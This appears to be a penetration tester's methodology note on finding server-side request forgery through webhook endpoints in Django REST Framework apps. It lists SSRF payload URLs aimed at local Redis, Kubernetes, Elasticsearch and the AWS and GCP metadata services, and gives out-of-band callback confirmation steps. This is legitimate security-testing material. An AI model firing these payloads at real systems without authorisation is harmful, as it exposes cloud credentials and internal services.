# SSRF Testing Methodology

## Webhook-Based SSRF (DRF Targets)

DRF apps often have TWO separate webhook systems — test BOTH:

| System | Endpoints | Notes |
|--------|-----------|-------|
| Primary (active) | `/api/v1/event-subscription/` | Accepts gopher://, dict://, http:// — file:// blocked by CF |
| Secondary (deprecated) | `/api/v1/webhook/` | Uses `delivery_type: "push"\|"postbox"`, `event_types: ["push_dossier","application_chosen"]` |

## Protocol Test Suite

```bash
gopher://127.0.0.1:6379/_INFO
dict://127.0.0.1:6379/info
http://localhost:8000/admin/
http://127.0.0.1:6379/
http://127.0.0.1:6443/       # K8s API
http://127.0.0.1:9200/       # Elasticsearch
http://169.254.169.254/latest/meta-data/   # AWS IMDS
http://metadata.google.internal/computeMetadata/v1/  # GCP
```

## Blind SSRF Confirmation

1. Set up OOB listener (interactsh, Burp Collaborator, webhook.site)
2. Create webhook pointing to `http://YOUR_ID.oastify.com/test`
3. Trigger delivery (create application, send message, etc.)
4. Check OOB listener for DNS/HTTP callback
5. **No callback = no SSRF** — error echoes are NOT confirmation

## Delivery Log Investigation

Check if delivery logs exist that might leak internal responses:
```bash
GET /api/v1/webhook/event/
GET /api/v1/webhook/{name}/event/
GET /api/v1/webhook/event/{id}/
```

**Webhook.Event schema:** `id` (uuid), `created` (timestamp), `type`, `data` (outbound payload only — NOT inbound response)

## SSRF is Blind Unless...

- The response is returned in the HTTP response body (reflected SSRF)
- You can read delivery logs that capture responses
- gopher:// enables write operations (Redis commands) without needing a response

## Related

- [[methodology/drf-pentest-patterns|DRF Pentest Patterns]] — webhook sections
- [[methodology/cross-account-session-testing|Cross-Account Session Testing]] — required for testing webhook IDOR
